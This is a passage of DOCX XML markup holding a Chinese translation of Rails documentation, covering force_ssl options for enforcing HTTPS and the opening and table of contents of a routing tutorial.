      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5AAFD1D2" w14:textId="77777777" w:rsidTr="00CA6AB6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3A20CEC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DinnerController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17A8D12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force_ssl</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="426C957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2611575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CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">就像过滤器一样，你也可以传递 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:only</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:except</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA6AB6">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来只对特定动作使用强制安全连接</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4776"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="089170CC" w14:textId="77777777" w:rsidTr="00CA6AB6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02501CE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DinnerController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5671157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xml:space="preserve">  force_ssl </w:t>
            </w:r>
            <w:r w:rsidRPr="00CA6AB6">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:only</w:t>
            </w:r>
            <w:r w:rsidRPr="00CA6AB6">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CA6AB6">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :cheeseburger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B5170B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or</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E5EF2D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xml:space="preserve">  force_ssl </w:t>
            </w:r>
            <w:r w:rsidRPr="00CA6AB6">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:except</w:t>
            </w:r>
            <w:r w:rsidRPr="00CA6AB6">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CA6AB6">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :cheeseburger</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B9685A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4EA0E69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请注意如果你发现你自己添加 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>force_ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 到很多控制器，你可能发现自己想要强制整个应用使用 HTTPS。那样的话，你可以设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="001A6006">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>config.force_ssl</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在你的环境文件中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBB6708" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="005D6D6E" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="696C6383" w14:textId="24CB1C75" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>4.2、</w:t>
      </w:r>
      <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>深入浅出说路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E328EF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这份教程介绍了 Rails 路由常用的特性。通过本文，你将会能够：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A3E65B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>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了解 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC933A8" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>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用 Resourceful 风格或者 tt&gt;match 方法 构建你的路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CFA4F3" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>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了解一个 action 是如何接收从路由来的参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F7CDDB" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>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用路由提供的 helper 来生成 URL 路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A0FA4A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="93"/>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一些更高级的技巧，例如 constraints and Rack endpoints。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EAEB768" w14:textId="7FFBD4B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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBEF869" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId355" w:anchor="1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 路由的意义</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7C4C8FA2"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56" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>链接 URL 和代码</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="202F4299"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57" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>用代码生成 URL 和 路径</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="501AAE17" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId358" w:anchor="2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Resource 路由规则: Rails 之道</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2A957F46"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59" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>web 与 Resource</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="44406EE1"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60" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>CRUD, Verbs, Actions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="76EA8E65"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61" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>URL 和 Path</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F659EAC"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62" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>同时定义多个 Resource</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1884E834"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63" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>单件 Resources</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3DCCE3D0"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64" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>控制器、命名空间(Namespaces),和路由</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="784C82FE"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65" w:anchor="2-7" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>嵌套(Nested)数组</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2A4A41B6"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66" w:anchor="2-8" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>从对象到路径 URL</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7DC7AB45"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67" w:anchor="2-9" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>加入额外的 RESTful 行为</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="70027332" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId368" w:anchor="3" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>非 Resourceful 路由</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="290A2C31"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69" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>相关参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="064E245A"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70" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>动态部分</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7ED54E48"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71" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>静态部分</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58292C32"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72" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>字符串队列</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E9166BC"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73" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>设置默认值</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6B1F1BB4"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74" w:anchor="3-6" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>命名路由</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2376A754"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75" w:anchor="3-7" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>HTTP 动词约定</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19FDFA64"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76" w:anchor="3-8" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>部分正则约定</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F7B7CA2"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77" w:anchor="3-9" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>请求限制</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7F69366D"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78" w:anchor="3-10" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>高级限定</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="025A032A"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79" w:anchor="3-11" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>通配路由匹配</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="523816A2"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80" w:anchor="3-12" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>重定向</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4CC91D6B"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81" w:anchor="3-13" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Routing to Rack Applications</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A7A772C"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82" w:anchor="3-14" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">使用 </w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>root</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="273AC301" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
